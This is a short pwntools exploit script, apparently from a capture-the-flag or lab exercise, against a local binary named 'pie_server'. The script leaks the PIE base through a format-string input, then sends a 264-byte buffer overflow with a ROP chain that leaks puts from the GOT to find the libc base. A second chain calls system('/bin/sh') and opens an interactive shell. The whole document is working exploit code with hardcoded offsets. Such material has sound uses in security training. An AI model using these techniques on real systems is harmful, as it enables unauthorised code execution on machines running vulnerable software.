from pwn import *

elf = context.binary = ELF('./pie_server', checksec=False)
io = process()
libc = elf.libc

### Obtain Pie Base in Runtime

io.sendline('%4$p')

io.recvuntil('Hello ')
elf_leak = int(io.recvline(), 16)

elf.address = elf_leak - 0x56b5
log.success(f'Pie base: {[hex(elf.address)]}')


### Ret2libc 

offset = 264
ret = 0x1016
pop_rdi_offset = 0x12ab

# Add gadget values to the PIE base
pop_rdi = elf.address + pop_rdi_offset
new_ret = elf.address + ret


payload = flat(
    b'A' * 264,
	pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.symbols['vuln']
)

io.sendlineafter('is :P\n', payload)
io.recvline()

# Puts leak
got_puts = unpack(io.recv()[:6].ljust(8, b"\x00"))
log.success(f'Leaked got_puts: {[hex(got_puts)]}')

# Libc base
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
libc.address = got_puts - 0x7f760
log.success(f'Libc base: {[hex(libc.address)]}')

# Updated system
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
system = 0x0528f0 + libc.address

# Updated binsh
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
binsh = 0x1a7e43 + libc.address

payload2 = flat(
    b'A' * offset,
    new_ret,
    pop_rdi,
    binsh,
    system
)

io.sendline(payload2)
io.interactive()













